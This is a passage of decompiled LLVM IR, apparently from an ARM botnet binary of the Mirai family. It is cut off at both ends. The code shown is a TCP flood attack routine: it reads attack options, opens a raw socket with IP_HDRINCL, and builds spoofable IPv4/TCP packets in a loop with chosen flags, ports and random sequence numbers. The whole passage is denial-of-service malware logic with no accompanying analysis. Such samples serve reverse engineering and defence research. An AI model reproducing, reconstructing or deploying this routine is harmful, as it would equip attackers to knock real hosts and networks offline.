  %v0_bc54 = load i32, i32* @sl, align 4
  store i32 %v0_bc54, i32* %r3.global-to-local, align 4
  %v0_bc58 = load i32, i32* @r5, align 4
  store i32 %v0_bc58, i32* %r0.global-to-local, align 4
  %v6_bc60 = inttoptr i32 %v0_bc4c to i32*
  %v7_bc60 = call i32 @attack_get_opt_int(i32 %v0_bc58, i32* %v6_bc60, i32 5, i32 %v0_bc54)
  %v1_bc6c = urem i32 %v7_bc60, 256
  store i32 %v1_bc6c, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_bc78 = load i32, i32* @r4, align 4
  store i32 %v0_bc78, i32* %r1.global-to-local, align 4
  %v0_bc7c = load i32, i32* @r5, align 4
  store i32 %v0_bc7c, i32* %r0.global-to-local, align 4
  %v6_bc84 = inttoptr i32 %v0_bc78 to i32*
  %v7_bc84 = call i32 @attack_get_opt_int(i32 %v0_bc7c, i32* %v6_bc84, i32 6, i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32))
  %v0_bc8c = load i32, i32* @r4, align 4
  store i32 %v0_bc8c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v7_bc84, i32* %fp.global-to-local, align 4
  %v0_bc9c = load i32, i32* @r5, align 4
  store i32 %v0_bc9c, i32* %r0.global-to-local, align 4
  %v5_bca0 = inttoptr i32 %v0_bc8c to i32*
  %v6_bca0 = call i32 @attack_get_opt_int(i32 %v0_bc9c, i32* %v5_bca0, i32 7, i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32))
  %v0_bca8 = load i32, i32* @r4, align 4
  store i32 %v0_bca8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 %v6_bca0, i32* %sb.global-to-local, align 4
  %v0_bcb8 = load i32, i32* @r5, align 4
  store i32 %v0_bcb8, i32* %r0.global-to-local, align 4
  %v5_bcbc = inttoptr i32 %v0_bca8 to i32*
  %v6_bcbc = call i32 @attack_get_opt_int(i32 %v0_bcb8, i32* %v5_bcbc, i32 16, i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32))
  %v0_bcc8 = load i32, i32* @r4, align 4
  store i32 %v0_bcc8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v0_bcd4 = load i32, i32* @r5, align 4
  store i32 %v0_bcd4, i32* %r0.global-to-local, align 4
  %v6_bcd8 = inttoptr i32 %v0_bcc8 to i32*
  %v7_bcd8 = call i32 @attack_get_opt_int(i32 %v0_bcd4, i32* %v6_bcd8, i32 17, i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32))
  %v0_bcdc = load i32, i32* @r4, align 4
  store i32 %v0_bcdc, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v0_bce8 = load i32, i32* @sl, align 4
  store i32 %v0_bce8, i32* %r3.global-to-local, align 4
  %v0_bcec = load i32, i32* @r5, align 4
  store i32 %v0_bcec, i32* %r0.global-to-local, align 4
  %v5_bcf0 = inttoptr i32 %v0_bcdc to i32*
  %v6_bcf0 = call i32 @attack_get_opt_int(i32 %v0_bcec, i32* %v5_bcf0, i32 10, i32 %v0_bce8)
  %v0_bcf4 = load i32, i32* @r4, align 4
  store i32 %v0_bcf4, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bd04 = load i32, i32* @r5, align 4
  store i32 %v0_bd04, i32* %r0.global-to-local, align 4
  %v5_bd08 = inttoptr i32 %v0_bcf4 to i32*
  %v6_bd08 = call i32 @attack_get_opt_int(i32 %v0_bd04, i32* %v5_bd08, i32 11, i32 1)
  %v0_bd0c = load i32, i32* @r4, align 4
  store i32 %v0_bd0c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v0_bd18 = load i32, i32* @sl, align 4
  store i32 %v0_bd18, i32* %r3.global-to-local, align 4
  %v0_bd1c = load i32, i32* @r5, align 4
  store i32 %v0_bd1c, i32* %r0.global-to-local, align 4
  %v5_bd20 = inttoptr i32 %v0_bd0c to i32*
  %v6_bd20 = call i32 @attack_get_opt_int(i32 %v0_bd1c, i32* %v5_bd20, i32 12, i32 %v0_bd18)
  %v0_bd24 = load i32, i32* @r4, align 4
  store i32 %v0_bd24, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_bd30 = load i32, i32* @sl, align 4
  store i32 %v0_bd30, i32* %r3.global-to-local, align 4
  %v0_bd34 = load i32, i32* @r5, align 4
  store i32 %v0_bd34, i32* %r0.global-to-local, align 4
  %v5_bd38 = inttoptr i32 %v0_bd24 to i32*
  %v6_bd38 = call i32 @attack_get_opt_int(i32 %v0_bd34, i32* %v5_bd38, i32 13, i32 %v0_bd30)
  %v0_bd3c = load i32, i32* @r4, align 4
  store i32 %v0_bd3c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  %v0_bd48 = load i32, i32* @sl, align 4
  store i32 %v0_bd48, i32* %r3.global-to-local, align 4
  %v0_bd4c = load i32, i32* @r5, align 4
  store i32 %v0_bd4c, i32* %r0.global-to-local, align 4
  %v5_bd50 = inttoptr i32 %v0_bd3c to i32*
  %v6_bd50 = call i32 @attack_get_opt_int(i32 %v0_bd4c, i32* %v5_bd50, i32 14, i32 %v0_bd48)
  %v0_bd54 = load i32, i32* @r4, align 4
  store i32 %v0_bd54, i32* %r1.global-to-local, align 4
  %v0_bd5c = load i32, i32* @sl, align 4
  store i32 %v0_bd5c, i32* %r3.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_bd64 = load i32, i32* @r5, align 4
  store i32 %v0_bd64, i32* %r0.global-to-local, align 4
  %v5_bd68 = inttoptr i32 %v0_bd54 to i32*
  %v6_bd68 = call i32 @attack_get_opt_int(i32 %v0_bd64, i32* %v5_bd68, i32 15, i32 %v0_bd5c)
  %v0_bd6c = load i32, i32* @r4, align 4
  store i32 %v0_bd6c, i32* %r1.global-to-local, align 4
  %v0_bd74 = load i32, i32* @sl, align 4
  store i32 %v0_bd74, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_bd7c = load i32, i32* @r5, align 4
  store i32 %v0_bd7c, i32* %r0.global-to-local, align 4
  %v5_bd80 = inttoptr i32 %v0_bd6c to i32*
  %v6_bd80 = call i32 @attack_get_opt_int(i32 %v0_bd7c, i32* %v5_bd80, i32 %v0_bd74, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bd8c = load i32, i32* @r4, align 4
  store i32 %v0_bd8c, i32* %r1.global-to-local, align 4
  store i32 %v6_bd80, i32* @r8, align 4
  %v0_bd94 = load i32, i32* @r5, align 4
  store i32 %v0_bd94, i32* %r0.global-to-local, align 4
  %v4_bd98 = inttoptr i32 %v0_bd8c to i32*
  %v5_bd98 = call i32 @attack_get_opt_int(i32 %v0_bd94, i32* %v4_bd98, i32 1, i32 1)
  %v2_bda4 = load i32, i32* @global_var_260b8.92, align 4
  store i32 %v2_bda4, i32* %r3.global-to-local, align 4
  %v1_bda8 = urem i32 %v5_bd98, 256
  store i32 %v1_bda8, i32* %ip.global-to-local, align 4
  %v0_bdac = load i32, i32* @r4, align 4
  store i32 %v0_bdac, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_bdb4 = load i32, i32* @r5, align 4
  store i32 %v0_bdb4, i32* %r0.global-to-local, align 4
  %v5_bdbc = inttoptr i32 %v0_bdac to i32*
  %v6_bdbc = call i32 @attack_get_opt_ip(i32 %v0_bdb4, i32* %v5_bdbc, i32 24, i32 %v2_bda4, i32 %v1_bda8)
  %v0_bdc4 = load i32, i32* @sl, align 4
  store i32 %v0_bdc4, i32* %r0.global-to-local, align 4
  %v1_bdc8 = inttoptr i32 %v0_bdc4 to i32*
  %v2_bdc8 = call i32 @__GI_time(i32* %v1_bdc8)
  %v1_bdcc = load i32, i32* @r6, align 4
  %v2_bdcc = add i32 %v1_bdcc, %v2_bdc8
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_bde0 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_bde0, i32* %r0.global-to-local, align 4
  %v7_bde4 = icmp eq i32 %v3_bde0, -1
  store i1 %v7_bde4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bde4, label %dec_label_pc_c2c8, label %dec_label_pc_bdf0

dec_label_pc_bdf0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_bdf8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_bdf8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_be00 = load i32, i32* @sl, align 4
  store i32 %v0_be00, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_be0c = call i32 @__GI_setsockopt(i32 %v3_bde0, i32 %v0_be00, i32 3, i32 %v6_bdf8, i32 4)
  store i32 %v5_be0c, i32* %r0.global-to-local, align 4
  %v7_be10 = icmp eq i32 %v5_be0c, -1
  store i1 %v7_be10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_be10, label %dec_label_pc_c2d4, label %dec_label_pc_be18

dec_label_pc_be18:                                ; preds = %dec_label_pc_bdf0
  store i32 %v8_bc28, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_be24 = load i32, i32* %fp.global-to-local, align 4
  %v0_be28 = load i32, i32* %sb.global-to-local, align 4
  %v3_be28 = mul i32 %v0_be28, 65536
  store i32 %v3_be28, i32* %sb.global-to-local, align 4
  %v3_be2c = urem i32 %v8_bc28, 65536
  store i32 %v3_be2c, i32* %r2.global-to-local, align 4
  %v3_be30 = urem i32 %v0_be24, 65536
  store i32 %v3_be30, i32* %r3.global-to-local, align 4
  %v3_be34 = urem i32 %v0_be28, 65536
  store i32 %v3_be34, i32* %ip.global-to-local, align 4
  %v2_be38 = icmp eq i32 %arg2, 0
  store i1 %v2_be38, i1* %cpsr_z.global-to-local, align 1
  %v0_be3c = load i32, i32* @sl, align 4
  store i32 %v0_be3c, i32* %stack_var_-44, align 4
  br i1 %v2_be38, label %dec_label_pc_c078.preheader, label %dec_label_pc_be50

dec_label_pc_be50:                                ; preds = %dec_label_pc_be18
  %v0_be60 = load i32, i32* @r8, align 4
  %v3_be60 = mul i32 %v0_be60, 65536
  %v1_be68 = add i32 %v3_be60, 2621440
  %tmp59 = mul i32 %v0_be24, 256
  %v3_be74 = and i32 %tmp59, 65280
  %tmp60 = mul i32 %v0_be28, 256
  %v3_be78 = and i32 %tmp60, 65280
  %tmp61 = udiv i32 %v0_be24, 256
  %v4_be80 = urem i32 %tmp61, 256
  %v5_be80 = or i32 %v4_be80, %v3_be74
  %tmp62 = udiv i32 %v1_be68, 256
  %v3_be84 = and i32 %tmp62, 65280
  %tmp63 = mul i32 %v8_bc28, 256
  %v3_be88 = and i32 %tmp63, 65280
  %tmp64 = udiv i32 %v0_be28, 256
  %v4_be8c = urem i32 %tmp64, 256
  %v5_be8c = or i32 %v4_be8c, %v3_be78
  store i32 %v5_be8c, i32* @fp, align 4
  %v4_be9c = udiv i32 %v1_be68, 16777216
  %v5_be9c = or i32 %v3_be84, %v4_be9c
  store i32 %v5_be9c, i32* @lr, align 4
  %tmp65 = udiv i32 %v8_bc28, 256
  %v4_bea0 = urem i32 %tmp65, 256
  %v5_bea0 = or i32 %v4_bea0, %v3_be88
  store i32 %v5_bea0, i32* @r5, align 4
  %tmp66 = mul i32 %v6_bcbc, 256
  %v3_beac = and i32 %tmp66, 65280
  %v1_beb0 = urem i32 %v6_bcf0, 2
  %v1_beb4 = urem i32 %v6_bd08, 2
  %tmp67 = udiv i32 %v6_bcbc, 256
  %v4_beb8 = urem i32 %tmp67, 256
  %v5_beb8 = or i32 %v4_beb8, %v3_beac
  %v1_bec4 = urem i32 %v6_bd20, 2
  store i32 %v1_bec4, i32* %r2.global-to-local, align 4
  %v1_bec8 = urem i32 %v6_bd38, 2
  store i32 %v1_bec8, i32* %r3.global-to-local, align 4
  store i32 %v6_bd50, i32* %ip.global-to-local, align 4
  store i32 %v6_bd68, i32* %r0.global-to-local, align 4
  store i32 %v6_bd20, i32* %r1.global-to-local, align 4
  %v1_bef0 = urem i32 %v6_bd50, 2
  store i32 %v1_bef0, i32* @sb, align 4
  store i32 %v0_be3c, i32* @r4, align 4
  %v1_bef8 = urem i32 %v6_bd20, 256
  store i32 %v1_bef8, i32* @r6, align 4
  %v1_befc = urem i32 %v6_bd68, 2
  store i32 %v1_befc, i32* @sl, align 4
  %v4_bf54 = sext i8 %v5_bc24 to i32
  %sext6 = mul nuw i32 %v5_be9c, 65536
  %v4_bf70 = sdiv i32 %sext6, 65536
  %sext7 = mul nuw i32 %v5_bea0, 65536
  %v4_bf78 = sdiv i32 %sext7, 65536
  %sext8 = mul nuw i32 %v5_be80, 65536
  %v4_bf94 = sdiv i32 %sext8, 65536
  %tmp = sub nsw i32 0, %v1_beb4
  %v4_bfe4 = and i32 %tmp, 16
  %tmp70 = sub nsw i32 0, %v1_bec4
  %v4_bff8 = and i32 %tmp70, 8
  %tmp71 = sub nsw i32 0, %v1_bec8
  %v4_c00c = and i32 %tmp71, 4
  %v1_bf64 = trunc i32 %v6_bc40 to i8
  br label %dec_label_pc_bf00

dec_label_pc_bf00:                                ; preds = %.thread10, %dec_label_pc_be50
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_bf0c = call i32 @calloc(i32 1510, i32 1)
  %v2_bf14 = load i32, i32* @r4, align 4
  %v5_bf14 = mul i32 %v2_bf14, 4
  %v6_bf14 = add i32 %v5_bf14, %v2_bbec
  %v7_bf14 = inttoptr i32 %v6_bf14 to i32*
  store i32 %v2_bf0c, i32* %v7_bf14, align 4
  %v3_bf18 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bf18, i32* %r2.global-to-local, align 4
  %v5_bf20 = mul i32 %v3_bf18, 24
  %v1_bf24 = load i32, i32* @r7, align 4
  %v2_bf24 = add i32 %v1_bf24, %v5_bf20
  store i32 %v2_bf24, i32* %r0.global-to-local, align 4
  store i32 %v2_bbec, i32* %r3.global-to-local, align 4
  %v4_bf2c = mul i32 %v3_bf18, 4
  %v5_bf2c = add i32 %v4_bf2c, %v2_bbec
  %v6_bf2c = inttoptr i32 %v5_bf2c to i32*
  %v7_bf2c = load i32, i32* %v6_bf2c, align 4
  store i32 %v7_bf2c, i32* %r1.global-to-local, align 4
  %v1_bf30 = inttoptr i32 %v7_bf2c to i8*
  %v2_bf30 = load i8, i8* %v1_bf30, align 1
  %tmp72 = urem i8 %v2_bf30, 16
  %v1_bf34 = zext i8 %tmp72 to i32
  %v1_bf38 = or i32 %v1_bf34, 64
  store i32 %v1_bf38, i32* %r3.global-to-local, align 4
  %v1_bf3c = trunc i32 %v1_bf38 to i8
  store i8 %v1_bf3c, i8* %v1_bf30, align 1
  %v0_bf40 = load i32, i32* %r1.global-to-local, align 4
  %v1_bf40 = inttoptr i32 %v0_bf40 to i8*
  %v2_bf40 = load i8, i8* %v1_bf40, align 1
  %v1_bf44 = and i8 %v2_bf40, -16
  %v1_bf48 = or i8 %v1_bf44, 5
  store i32 %v1_bc6c, i32* %ip.global-to-local, align 4
  store i8 %v1_bf48, i8* %v1_bf40, align 1
  store i32 %v4_bf54, i32* %r2.global-to-local, align 4
  %v2_bf58 = load i32, i32* %r1.global-to-local, align 4
  %v3_bf58 = add i32 %v2_bf58, 1
  %v4_bf58 = inttoptr i32 %v3_bf58 to i8*
  store i8 %v5_bc24, i8* %v4_bf58, align 1
  store i32 %v1_bc48, i32* %r3.global-to-local, align 4
  %v0_bf60 = load i32, i32* %ip.global-to-local, align 4
  %v2_bf60 = icmp eq i32 %v0_bf60, 0
  store i1 %v2_bf60, i1* %cpsr_z.global-to-local, align 1
  %v2_bf64 = load i32, i32* %r1.global-to-local, align 4
  %v3_bf64 = add i32 %v2_bf64, 8
  %v4_bf64 = inttoptr i32 %v3_bf64 to i8*
  store i8 %v1_bf64, i8* %v4_bf64, align 1
  %v0_bf68 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bf68, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_bf00
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_bf6c = load i32, i32* %r1.global-to-local, align 4
  %v4_bf6c = add i32 %v3_bf6c, 6
  %v5_bf6c = inttoptr i32 %v4_bf6c to i16*
  store i16 64, i16* %v5_bf6c, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_bf00, %bb
  store i32 %v4_bf70, i32* %ip.global-to-local, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v4_bf78, i32* %r2.global-to-local, align 4
  %v2_bf7c = load i32, i32* %r1.global-to-local, align 4
  %v3_bf7c = add i32 %v2_bf7c, 9
  %v4_bf7c = inttoptr i32 %v3_bf7c to i8*
  store i8 6, i8* %v4_bf7c, align 1
  %v0_bf80 = load i32, i32* %ip.global-to-local, align 4
  %v1_bf80 = trunc i32 %v0_bf80 to i16
  %v2_bf80 = load i32, i32* %r1.global-to-local, align 4
  %v3_bf80 = add i32 %v2_bf80, 2
  %v4_bf80 = inttoptr i32 %v3_bf80 to i16*
  store i16 %v1_bf80, i16* %v4_bf80, align 2
  store i32 %v6_bdbc, i32* %ip.global-to-local, align 4
  %v1_bf88 = load i32, i32* %r1.global-to-local, align 4
  %v2_bf88 = add i32 %v1_bf88, 12
  %v3_bf88 = inttoptr i32 %v2_bf88 to i32*
  store i32 %v6_bdbc, i32* %v3_bf88, align 4
  %v0_bf8c = load i32, i32* %r2.global-to-local, align 4
  %v1_bf8c = trunc i32 %v0_bf8c to i16
  %v2_bf8c = load i32, i32* %r1.global-to-local, align 4
  %v3_bf8c = add i32 %v2_bf8c, 4
  %v4_bf8c = inttoptr i32 %v3_bf8c to i16*
  store i16 %v1_bf8c, i16* %v4_bf8c, align 2
  %v0_bf90 = load i32, i32* %r0.global-to-local, align 4
  %v1_bf90 = add i32 %v0_bf90, 16
  %v2_bf90 = inttoptr i32 %v1_bf90 to i32*
  %v3_bf90 = load i32, i32* %v2_bf90, align 4
  store i32 %v3_bf90, i32* %r2.global-to-local, align 4
  store i32 %v4_bf94, i32* %r0.global-to-local, align 4
  %v1_bf98 = load i32, i32* %r1.global-to-local, align 4
  %v2_bf98 = add i32 %v1_bf98, 16
  %v3_bf98 = inttoptr i32 %v2_bf98 to i32*
  store i32 %v3_bf90, i32* %v3_bf98, align 4
  %v0_bf9c = load i32, i32* %r0.global-to-local, align 4
  %v1_bf9c = trunc i32 %v0_bf9c to i16
  %v2_bf9c = load i32, i32* %r1.global-to-local, align 4
  %v3_bf9c = add i32 %v2_bf9c, 20
  %v4_bf9c = inttoptr i32 %v3_bf9c to i16*
  store i16 %v1_bf9c, i16* %v4_bf9c, align 2
  %v0_bfa0 = load i32, i32* %r1.global-to-local, align 4
  %v1_bfa0 = add i32 %v0_bfa0, 20
  store i32 %v1_bfa0, i32* @r4, align 4
  %v1_bfa4 = add i32 %v0_bfa0, 32
  %v2_bfa4 = inttoptr i32 %v1_bfa4 to i8*
  %v3_bfa4 = load i8, i8* %v2_bfa4, align 1
  %v4_bfa4 = zext i8 %v3_bfa4 to i32
  %v1_bfa8 = and i32 %v4_bfa4, 95
  store i32 %v1_bfa8, i32* %r3.global-to-local, align 4
  %v1_bfac = add i32 %v0_bfa0, 33
  %v2_bfac = inttoptr i32 %v1_bfac to i8*
  %v3_bfac = load i8, i8* %v2_bfac, align 1
  %v4_bfac = zext i8 %v3_bfac to i32
  store i32 %v4_bfac, i32* %r2.global-to-local, align 4
  %v1_bfb0 = or i32 %v1_bfa8, 80
  %v1_bfb4 = add i32 %v0_bfa0, 40
  store i32 %v1_bfb4, i32* @r5, align 4
  store i32 %v1_beb0, i32* %r1.global-to-local, align 4
  %v1_bfbc = trunc i32 %v1_bfb0 to i8
  store i8 %v1_bfbc, i8* %v2_bfa4, align 1
  store i32 %v5_beb8, i32* %r3.global-to-local, align 4
  %v0_bfc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_bfc4 = and i32 %v0_bfc4, -33
  %v1_bfc8 = load i32, i32* %r1.global-to-local, align 4
  %v4_bfc8 = mul i32 %v1_bfc8, 32
  %v5_bfc8 = or i32 %v4_bfc8, %v1_bfc4
  store i32 %v5_bfc8, i32* %r2.global-to-local, align 4
  %v1_bfcc = load i32, i32* @r4, align 4
  %v2_bfcc = add i32 %v1_bfcc, 4
  %v3_bfcc = inttoptr i32 %v2_bfcc to i32*
  store i32 %v5_beb8, i32* %v3_bfcc, align 4
  %v0_bfd0 = load i32, i32* @fp, align 4
  %v1_bfd0 = trunc i32 %v0_bfd0 to i16
  %v2_bfd0 = load i32, i32* @r4, align 4
  %v3_bfd0 = add i32 %v2_bfd0, 2
  %v4_bfd0 = inttoptr i32 %v3_bfd0 to i16*
  store i16 %v1_bfd0, i16* %v4_bfd0, align 2
  %v0_bfd4 = load i32, i32* %r2.global-to-local, align 4
  %v1_bfd4 = trunc i32 %v0_bfd4 to i8
  %v2_bfd4 = load i32, i32* @r4, align 4
  %v3_bfd4 = add i32 %v2_bfd4, 13
  %v4_bfd4 = inttoptr i32 %v3_bfd4 to i8*
  store i8 %v1_bfd4, i8* %v4_bfd4, align 1
  %v0_bfd8 = load i32, i32* @r4, align 4
  %v1_bfd8 = add i32 %v0_bfd8, 13
  %v2_bfd8 = inttoptr i32 %v1_bfd8 to i8*
  %v3_bfd8 = load i8, i8* %v2_bfd8, align 1
  %v4_bfd8 = zext i8 %v3_bfd8 to i32
  store i32 %v1_beb4, i32* %ip.global-to-local, align 4
  %v1_bfe0 = and i32 %v4_bfd8, 239
  %v5_bfe4 = or i32 %v1_bfe0, %v4_bfe4
  store i32 %v5_bfe4, i32* %r3.global-to-local, align 4
  %v1_bfe8 = trunc i32 %v5_bfe4 to i8
  store i8 %v1_bfe8, i8* %v2_bfd8, align 1
  %v0_bfec = load i32, i32* @r4, align 4
  %v1_bfec = add i32 %v0_bfec, 13
  %v2_bfec = inttoptr i32 %v1_bfec to i8*
  %v3_bfec = load i8, i8* %v2_bfec, align 1
  %v4_bfec = zext i8 %v3_bfec to i32
  store i32 %v1_bec4, i32* %r0.global-to-local, align 4
  %v1_bff4 = and i32 %v4_bfec, 247
  %v5_bff8 = or i32 %v1_bff4, %v4_bff8
  store i32 %v5_bff8, i32* %r2.global-to-local, align 4
  %v1_bffc = trunc i32 %v5_bff8 to i8
  store i8 %v1_bffc, i8* %v2_bfec, align 1
  %v0_c000 = load i32, i32* @r4, align 4
  %v1_c000 = add i32 %v0_c000, 13
  %v2_c000 = inttoptr i32 %v1_c000 to i8*
  %v3_c000 = load i8, i8* %v2_c000, align 1
  %v4_c000 = zext i8 %v3_c000 to i32
  store i32 %v1_bec8, i32* %r1.global-to-local, align 4
  %v1_c008 = and i32 %v4_c000, 251
  %v5_c00c = or i32 %v1_c008, %v4_c00c
  store i32 %v5_c00c, i32* %r3.global-to-local, align 4
  %v1_c010 = trunc i32 %v5_c00c to i8
  store i8 %v1_c010, i8* %v2_c000, align 1
  %v0_c014 = load i32, i32* @r4, align 4
  %v1_c014 = add i32 %v0_c014, 13
  %v2_c014 = inttoptr i32 %v1_c014 to i8*
  %v3_c014 = load i8, i8* %v2_c014, align 1
  %v4_c014 = zext i8 %v3_c014 to i32
  %v1_c018 = and i32 %v4_c014, 253
  %v1_c01c = load i32, i32* @sb, align 4
  %v3_c01c = mul i32 %v1_c01c, 2
  %v4_c01c = or i32 %v3_c01c, %v1_c018
  store i32 %v4_c01c, i32* %r2.global-to-local, align 4
  %v1_c020 = trunc i32 %v4_c01c to i8
  store i8 %v1_c020, i8* %v2_c014, align 1
  %v0_c024 = load i32, i32* @r4, align 4
  %v1_c024 = add i32 %v0_c024, 13
  %v2_c024 = inttoptr i32 %v1_c024 to i8*
  %v3_c024 = load i8, i8* %v2_c024, align 1
  %v4_c024 = zext i8 %v3_c024 to i32
  %v1_c028 = and i32 %v4_c024, 254
  %v0_c02c = load i32, i32* @sl, align 4
  %v2_c02c = or i32 %v1_c028, %v0_c02c
  store i32 %v2_c02c, i32* %r3.global-to-local, align 4
  %v1_c030 = trunc i32 %v2_c02c to i8
  store i8 %v1_c030, i8* %v2_c024, align 1
  %v0_c034 = call i32 @rand_next()
  %v1_c034 = trunc i32 %v0_c034 to i16
  store i32 %v0_c034, i32* %r0.global-to-local, align 4
  %v0_c038 = load i32, i32* @r6, align 4
  %v2_c038 = icmp eq i32 %v0_c038, 0
  store i1 %v2_c038, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c038, label %.thread10, label %bb68

bb68:                                             ; preds = %.thread
  %v1_c03c = load i32, i32* @r4, align 4
  %v2_c03c = add i32 %v1_c03c, 13
  %v3_c03c = inttoptr i32 %v2_c03c to i8*
  %v4_c03c = load i8, i8* %v3_c03c, align 1
  %v5_c03c = zext i8 %v4_c03c to i32
  %v2_c040 = or i32 %v5_c03c, 8
  store i32 %v2_c040, i32* %r3.global-to-local, align 4
  %v2_c044 = trunc i32 %v2_c040 to i8
  store i8 %v2_c044, i8* %v3_c03c, align 1
  br label %.thread10

.thread10:                                        ; preds = %.thread, %bb68
  %v3_c048 = load i32, i32* @r4, align 4
  %v4_c048 = add i32 %v3_c048, 14
  %v5_c048 = inttoptr i32 %v4_c048 to i16*
  store i16 %v1_c034, i16* %v5_c048, align 2
  %v0_c04c = load i32, i32* @r8, align 4
  store i32 %v0_c04c, i32* %r1.global-to-local, align 4
  %v0_c050 = load i32, i32* @r5, align 4
  store i32 %v0_c050, i32* %r0.global-to-local, align 4
  %v2_c054 = call i32 @rand_alphastr(i32 %v0_c050, i32 %v0_c04c)
  store i32 %v2_c054, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c05c = load i32, i32* @r5, align 4
  %v3_c05c = load i32, i32* @r8, align 4
  %v4_c05c = add i32 %v3_c05c, %v2_c05c
  %v5_c05c = inttoptr i32 %v4_c05c to i8*
  store i8 0, i8* %v5_c05c, align 1
  %v3_c060 = load i32, i32* %stack_var_-44, align 4
  %v1_c064 = add i32 %v3_c060, 1
  store i32 %v1_c064, i32* @r4, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v9_c06c = icmp eq i32 %v1_c064, %arg2
  store i1 %v9_c06c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c064, i32* %stack_var_-44, align 4
  %v5_c074 = icmp slt i32 %v1_c064, %arg2
  br i1 %v5_c074, label %dec_label_pc_bf00, label %dec_label_pc_c078.preheader

dec_label_pc_c078.preheader:                      ; preds = %.thread10, %dec_label_pc_be18
  %v2_c0b4 = icmp eq i32 %v6_bdbc, -1
  %v7_c0b4 = icmp eq i32 %v6_bdbc, -1
  %v9_c228 = icmp eq i32 %v3_be2c, ptrtoint ([3 x i8]* @global_var_ffff.36 to i32)
  %v2_c28c = icmp eq i32 %v1_bda8, 0
  br label %dec_label_pc_c078

dec_label_pc_c078:                                ; preds = %dec_label_pc_c078.preheader, %dec_label_pc_c2b4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 %v2_be38, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_be38, label %dec_label_pc_c2b4, label %dec_label_pc_c08c

dec_label_pc_c08c:                                ; preds = %dec_label_pc_c078
  %v0_c08c = load i32, i32* @r8, align 4
  %v3_c08c = mul i32 %v0_c08c, 65536
  %v1_c090 = add i32 %v3_c08c, 1310720
  store i32 %v1_c090, i32* %r2.global-to-local, align 4
  %tmp69 = udiv i32 %v1_c090, 256
  %v3_c098 = and i32 %tmp69, 65280
  store i32 %v3_c098, i32* %r3.global-to-local, align 4
  %v4_c09c = udiv i32 %v1_c090, 16777216
  %v5_c09c = or i32 %v3_c098, %v4_c09c
  store i32 %v5_c09c, i32* @fp, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_c0a4 = add i32 %v0_c08c, 20
  store i32 %v1_c0a4, i32* @sb, align 4
  %v1_c0a8 = add i32 %v0_c08c, 40
  store i32 %v1_c0a8, i32* @sl, align 4
  br label %dec_label_pc_c194

dec_label_pc_c0b0:                                ; preds = %dec_label_pc_c194
  store i32 %v6_bdbc, i32* %r0.global-to-local, align 4
  store i1 %v7_c0b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c0b4, label %dec_label_pc_c218, label %dec_label_pc_c0bc

dec_label_pc_c0bc:                                ; preds = %dec_label_pc_c1b8, %dec_label_pc_c0b0
  store i32 %v3_be2c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* @r4, align 4
  store i1 %v9_c228, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c228, label %dec_label_pc_c234, label %dec_label_pc_c0d0

